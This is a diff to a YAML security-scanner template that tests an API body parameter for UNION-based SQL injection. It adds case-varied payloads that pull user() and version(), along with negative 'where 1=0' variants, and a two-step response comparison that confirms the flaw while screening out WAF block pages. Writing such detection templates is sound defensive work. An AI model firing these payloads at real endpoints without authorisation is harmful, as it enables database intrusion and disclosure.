@@ -89,53 +89,110 @@ wordLists:
     - "' uNion sELEct 1, user(), version()--"
     - "' UnIon sElEcT 1, user(), version()--"
     - "' unIoN sElEcT 1, user(), version()--"
+  unionBasedNegativePayloads:
+    - "' unIon SeLeCt 1, user(), version() where 1=0 --"
+    - "' UNIon seLeCt 1, user(), version() where 1=0 --"
+    - "' UnIon SELEct 1, user(), version() where 1=0 --"
+    - "' uniON SELect 1, user(), version() where 1=0 --"
+    - "' Union SeLeCt 1, user(), version() where 1=0 --"
+    - "' UNION selEct 1, user(), version() where 1=0 --"
+    - "' unION SELect 1, user(), version() where 1=0 --"
+    - "' uNion sELEct 1, user(), version() where 1=0 --"
+    - "' UnIon sElEcT 1, user(), version() where 1=0 --"
+    - "' unIoN sElEcT 1, user(), version() where 1=0 --"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${unionBasedPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - Attention Required!
-      - CloudFlare
-      - Sorry, you have been blocked
-      - " unIon SeLeCt "
-    contains_either:
-      - version
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - "version"
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - " UNION SELECT "          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${unionBasedNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0 
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - " UNION SELECT "
+            - "version"
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit                                      
 
   
   
